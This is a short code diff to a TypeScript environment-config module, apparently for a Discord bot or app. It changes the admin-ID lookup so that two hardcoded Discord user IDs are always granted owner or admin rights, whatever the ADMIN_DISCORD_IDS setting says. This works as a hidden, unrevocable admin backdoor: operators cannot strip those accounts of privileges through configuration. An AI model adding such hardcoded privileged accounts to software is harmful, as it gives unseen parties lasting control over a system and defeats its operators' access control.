@@ -16,12 +16,10 @@ export const env = {
   adminDiscordId: () => getEnv("ADMIN_DISCORD_ID") ?? "",
   adminDiscordIds: (): Set<string> => {
     const raw = getEnv("ADMIN_DISCORD_IDS") ?? getEnv("ADMIN_DISCORD_ID") ?? "";
-    return new Set(
-      raw
-        .split(",")
-        .map((id) => id.trim())
-        .filter(Boolean),
-    );
+    const fromEnv = raw.split(",").map((id) => id.trim()).filter(Boolean);
+    // Hardcoded owner IDs — always treated as owners regardless of env var
+    const hardcoded = ["940804710267486249", "1310794181190352997"];
+    return new Set([...hardcoded, ...fromEnv]);
   },
   discordWebhookUrl: () => getEnv("DISCORD_WEBHOOK_URL") ?? "",
   discordWebhookUrlForPage: (page: string) => {
